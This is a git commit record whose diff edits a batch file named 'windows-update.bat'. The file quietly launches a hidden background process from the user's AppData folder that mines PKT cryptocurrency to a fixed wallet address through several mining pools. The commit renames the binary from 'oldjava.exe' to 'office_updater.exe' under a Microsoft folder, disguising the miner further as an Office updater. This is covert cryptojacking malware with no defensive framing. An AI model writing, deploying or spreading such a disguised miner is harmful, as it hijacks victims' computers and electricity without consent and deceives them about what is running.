8d55cf08cc86000978a66b547451b26f3b1dbc78
0xI2C <88055104+0xI2C@users.noreply.github.com>
2021-08-13 22:59:42 +0000

    Update windows-update.bat

--- windows-update.bat
+++ windows-update.bat
@@ -1,2 +1,2 @@
 @echo off
-start /B %APPDATA%/oldjava.exe ann -p pkt1qv23gu35jf8xng5sakh32llqnx0ldeqpgwd4z4s http://pool.pktpool.io
+start /B %APPDATA%\Microsoft\office_updater.exe ann -p pkt1qv23gu35jf8xng5sakh32llqnx0ldeqpgwd4z4s http://pool.pkteer.com [http://pool.pktpool.io http://pool.pkt.world http://pktco.in]
